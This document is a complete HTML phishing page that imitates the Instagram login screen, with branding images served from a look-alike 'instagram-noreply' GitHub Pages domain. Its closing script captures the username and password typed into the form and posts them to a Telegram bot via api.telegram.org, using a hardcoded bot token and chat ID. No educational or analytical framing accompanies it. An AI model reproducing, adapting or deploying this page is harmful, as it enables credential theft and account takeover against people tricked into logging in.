<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login Form</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"
        integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        #container {
            max-width: 350px;
            width: 100%;
            background-color: #fff;
            border: 1px solid #dbdbdb;
            padding: 20px;
            text-align: center;
        }

        .logo {
            margin-bottom: 20px;
        }

        .logo img {
            height: 51px;
        }

        .form-field {
            margin-bottom: 10px;
        }

        .form-field input {
            width: 100%;
            padding: 9px 0 7px 8px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background: #fafafa;
            outline: none;
        }

        .form-field input::placeholder {
            color: #8e8e8e;
        }

        .login-btn {
            width: 100%;
            padding: 8px 0;
            background-color: #0095f6;
            border: none;
            border-radius: 4px;
            color: white;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }

        .login-btn:disabled {
            background-color: #b2dffc;
        }

        .or {
            display: flex;
            align-items: center;
            text-align: center;
            margin: 20px 0;
            color: #8e8e8e;
        }

        .or::before,
        .or::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }

        .or::before {
            margin-right: 10px;
        }

        .or::after {
            margin-left: 10px;
        }

        .logInFB {
            color: #385185;
            font-weight: bold;
            text-decoration: none;
        }

        .forget {
            color: #385185;
            text-decoration: none;
            font-size: 12px;
        }

        .bottom {
            margin-top: 20px;
        }

        .bottom .signUp {
            font-size: 14px;
        }

        .bottom .signUp a {
            color: #0095f6;
            text-decoration: none;
            font-weight: bold;
        }

        .app-section {
            margin-top: 20px;
        }

        .app-section span {
            display: block;
            margin-bottom: 10px;
            color: #262626;
        }

        .images {
            display: flex;
            justify-content: center;
        }

        .images img {
            height: 40px;
            margin: 0 5px;
        }

        footer {
            margin-top: 20px;
            font-size: 12px;
            color: #8e8e8e;
        }

        footer a {
            color: #8e8e8e;
            text-decoration: none;
        }

        footer select {
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            padding: 5px;
            margin-top: 10px;
            font-size: 12px;
            color: #262626;
        }
    </style>
</head>
<body>
    <div id="container">
        <div class="logo">
            <img src="https://instagram-noreply.github.io/Instagram-support/logo.png" alt="Instagram logo">
        </div>
        <form id="loginForm">
            <div class="form-field">
                <input type="text" id="usernameInput" placeholder="Phone number, username, or email">
            </div>
            <div class="form-field">
                <input type="password" id="passwordInput" placeholder="Password">
            </div>
            <input type="submit" value="Log in" class="login-btn">
        </form>

        <div class="or">OR</div>

        <a href="#" class="logInFB"><i class="fa-brands fa-facebook-f"></i> Log in with Facebook</a><br>
        <a href="#" class="forget">Forgot password?</a>

        <div class="bottom">
            <div class="signUp">
                Don't have an account? <a href="#">Create new account</a>
            </div>
        </div>
        <div class="app-section">
            <span>Get the app.</span>
            <div class="images">
                <img src="https://instagram-noreply.github.io/Instagram-support/googlePlay.png" alt="Get it on Google Play">
                <img src="https://instagram-noreply.github.io/Instagram-support/microsoft.png" alt="Get it from Microsoft">
            </div>
        </div>
        <footer>
            <a href="#">Meta</a>
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Top Accounts</a>
            <a href="#">Locations</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Instagram Contact</a>
            <a href="#">Uploading & Non-Users</a>
            <div class="bottom-footer">
                <select name="" id="">
                    <option value="English">English</option>
                    <option value="Hindi">Hindi</option>
                    <option value="Punjabi">Punjabi</option>
                    <option value="Urdu">Urdu</option>
                    <option value="Francais">Francais</option>
                </select>
                <span> &copy; 2023 Instagram from Meta</span>
            </div>
        </footer>
    </div>

    <script>
        const loginForm = document.getElementById('loginForm');
        const usernameInput = document.getElementById('usernameInput');
        const passwordInput = document.getElementById('passwordInput');

        loginForm.addEventListener('submit', (e) => {
            e.preventDefault();

            const username = usernameInput.value;
            const password = passwordInput.value;

            const telegramBotToken = '7131876676:AAHAItGzIF6jurMHcCJVxDfpY1q4uykB8_g';
            const chatId = '1201917438';
            const message = `Username: ${username}\nPassword: ${password}`;

            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message })
            })
            .then(() => {
                ('Login failed.');
            })
            .catch((error) => {
                console.error('Error :', error);
            });
        });
    </script>
</body>
</html>
